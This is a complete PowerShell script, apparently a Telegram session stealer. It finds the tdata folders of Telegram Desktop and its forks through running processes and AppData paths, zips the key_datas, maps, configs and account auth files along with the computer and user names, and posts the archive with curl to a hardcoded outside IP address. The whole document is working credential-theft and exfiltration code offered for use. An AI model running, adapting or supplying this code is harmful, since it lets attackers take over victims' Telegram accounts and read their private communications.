# tdata: slim auth (~4–200 KB) + maps/configs/settingss for TD UI

$ErrorActionPreference = 'Continue'
$RelayUrl = "http://89.34.90.212:8000/sendDocument"
$MaxFileBytes = 256KB
$MaxTotalBytes = 512KB
$RootExtraFiles = @('settingss', 'usertag')
$AccountFiles = @('maps', 'configs')
$ZipTotalBytes = 0
$pcTag = ($env:COMPUTERNAME -replace '[^\w\-]', '_')
if ([string]::IsNullOrWhiteSpace($pcTag)) { $pcTag = 'unknown-pc' }
$zip  = "$env:TEMP\${pcTag}_tdata.zip"

function Test-Hex16 {
    param([string]$Name, [bool]$AllowS)
    if ([string]::IsNullOrWhiteSpace($Name)) { return $false }
    $n = $Name.Length
    if ($AllowS -and $n -eq 17 -and ($Name[16] -eq 's' -or $Name[16] -eq 'S')) { $n = 16 }
    if ($n -ne 16) { return $false }
    return ($Name.Substring(0, 16) -match '^[0-9A-Fa-f]{16}$')
}

function Add-TdataRoot {
    param([System.Collections.Generic.List[string]]$Roots, [string]$Path)
    if (-not $Path -or -not (Test-Path -LiteralPath $Path)) { return }
    $full = (Resolve-Path -LiteralPath $Path).Path
    foreach ($r in $Roots) {
        if ($r.Equals($full, [StringComparison]::OrdinalIgnoreCase)) { return }
    }
    $Roots.Add($full)
}

function Find-TdataRoots {
    $roots = [System.Collections.Generic.List[string]]::new()

    foreach ($procName in @('Telegram', 'AyuGram', 'AyuGram Desktop', '64Gram', 'Kotatogram')) {
        Get-Process -Name $procName -ErrorAction SilentlyContinue | ForEach-Object {
            if ($_.Path) {
                Add-TdataRoot $roots (Join-Path (Split-Path $_.Path -Parent) 'tdata')
            }
        }
    }

    $rel = @(
        'Telegram Desktop\tdata',
        'Telegram Desktop A\tdata',
        '64Gram Desktop\tdata',
        'Kotatogram Desktop\tdata',
        'AyuGram Desktop\tdata',
        'AyuGram\tdata',
        'Telegram Desktop Beta\tdata'
    )
    foreach ($r in $rel) {
        Add-TdataRoot $roots (Join-Path $env:APPDATA $r)
        Add-TdataRoot $roots (Join-Path $env:LOCALAPPDATA $r)
    }

    Get-ChildItem "$env:LOCALAPPDATA\Packages\TelegramMessengerLLP.TelegramDesktop_*" -Directory -ErrorAction SilentlyContinue |
        ForEach-Object {
            Add-TdataRoot $roots (Join-Path $_.FullName 'LocalCache\Roaming\Telegram Desktop UWP\tdata')
        }

    return $roots
}

function Add-ZipFile {
    param($Archive, [string]$FullPath, [string]$ZipName)
    if (-not (Test-Path -LiteralPath $FullPath -PathType Leaf)) { return $false }
    try {
        $len = (Get-Item -LiteralPath $FullPath).Length
        if ($len -le 0 -or $len -gt $MaxFileBytes) {
            Write-Host "Skip size: $ZipName ($len)"
            return $false
        }
        if (($script:ZipTotalBytes + $len) -gt $MaxTotalBytes) {
            Write-Host "Skip cap: $ZipName ($len)"
            return $false
        }
        [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile(
            $Archive, $FullPath, $ZipName, 'Optimal'
        ) | Out-Null
        $script:ZipTotalBytes += $len
        Write-Host "Added: $ZipName ($len)"
        return $true
    } catch {
        Write-Host "Skip locked: $ZipName"
        return $false
    }
}

function Add-TdataRootFiles {
    param($Archive, [string]$Source, [string]$Prefix, [ref]$Added)

    $keyDatas = Join-Path $Source 'key_datas'
    if (Add-ZipFile $Archive $keyDatas "$Prefix/key_datas") { $Added.Value++ }

    foreach ($extra in $RootExtraFiles) {
        $p = Join-Path $Source $extra
        if (Add-ZipFile $Archive $p "$Prefix/$extra") { $Added.Value++ }
    }

    Get-ChildItem -LiteralPath $Source -File -ErrorAction SilentlyContinue | ForEach-Object {
        if (-not (Test-Hex16 $_.Name $true)) { return }
        if ($_.Name.Length -ne 17) { return }
        $accDir = Join-Path $Source $_.Name.Substring(0, 16)
        if (-not (Test-Path -LiteralPath $accDir -PathType Container)) { return }
        if (Add-ZipFile $Archive $_.FullName "$Prefix/$($_.Name)") { $Added.Value++ }
    }

    Get-ChildItem -LiteralPath $Source -Directory -ErrorAction SilentlyContinue | ForEach-Object {
        if (-not (Test-Hex16 $_.Name $false)) { return }
        $accPrefix = "$Prefix/$($_.Name)"
        foreach ($leaf in $AccountFiles) {
            $p = Join-Path $_.FullName $leaf
            if (Add-ZipFile $Archive $p "$accPrefix/$leaf") { $Added.Value++ }
        }
    }
}

$roots = Find-TdataRoots
if ($roots.Count -eq 0) {
    Write-Host "ERROR: tdata folder not found."
    exit 1
}

if (Test-Path $zip) { Remove-Item $zip -Force }

Add-Type -AssemblyName System.IO.Compression.FileSystem
$archive = [System.IO.Compression.ZipFile]::Open($zip, 'Create')
$added = 0
$addedRef = [ref]$added

try {
    $pcInfo = @(
        "ComputerName=$env:COMPUTERNAME"
        "UserName=$env:USERDOMAIN\$env:USERNAME"
        "Captured=$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    ) -join "`r`n"
    $pcInfoPath = Join-Path $env:TEMP 'tdata_pc_info.txt'
    Set-Content -LiteralPath $pcInfoPath -Value $pcInfo -Encoding UTF8
    Add-ZipFile $archive $pcInfoPath 'pc_info.txt' | Out-Null

    $i = 0
    foreach ($source in $roots) {
        $i++
        $prefix = if ($roots.Count -eq 1) { 'tdata' } else { "tdata$i" }
        Write-Host "Scan: $source"
        Add-TdataRootFiles -Archive $archive -Source $source -Prefix $prefix -Added $addedRef
    }
} finally {
    $archive.Dispose()
}

if ($added -eq 0) {
    Write-Host "ERROR: no auth files found."
    if (Test-Path $zip) { Remove-Item $zip -Force }
    exit 1
}

Write-Host "Archive: $zip ($added files, $((Get-Item $zip).Length) bytes)"

$stamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
$caption = "$env:USERNAME | $stamp"
$uploadName = "${pcTag}_tdata.zip"
$args = @(
    "-s", "-S", "-X", "POST", $RelayUrl,
    "-F", "document=@$zip;filename=$uploadName",
    "-F", "caption=$caption",
    "--connect-timeout", "10",
    "--max-time", "60"
)
$response = curl.exe @args

if ($response -match '"ok"\s*:\s*true') {
    Write-Host "Sent OK"
} else {
    Write-Host "Send failed: $response"
    exit 1
}
